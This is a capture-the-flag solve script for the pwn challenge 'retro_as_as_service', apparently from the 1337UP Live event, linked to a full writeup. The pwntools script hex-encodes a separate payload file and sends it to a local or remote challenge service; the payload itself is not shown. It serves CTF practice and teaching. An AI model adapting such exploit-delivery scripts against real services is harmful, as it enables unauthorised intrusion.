[FULL OFFICIAL WRITEUP](https://github.com/D13David/ctf-writeups/tree/main/1337uplive/pwn/retro_as_as_service)

#### solve.py

```py
from pwn import *

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

gdbscript = '''
'''.format(**locals())

exe = './runtime'
exe_args = ['payload.prg']
elf = context.binary = ELF(exe, checksec=False)
context.log_level = 'info'
context(terminal=['tmux', 'split-window', '-h'])

def file_to_hex(filename):
    try:
        with open(filename, 'rb') as file:
            file_data = file.read()
            hex_data = file_data.hex()
            return hex_data
    except FileNotFoundError:
        print(f"File '{filename}' not found.")

REMOTE = True

if REMOTE == False:
    io = start(exe_args)
else:
    io = start()
    hex_data = file_to_hex("payload.prg")
    io.sendline(hex_data.encode())
    print(io.recvall())
```
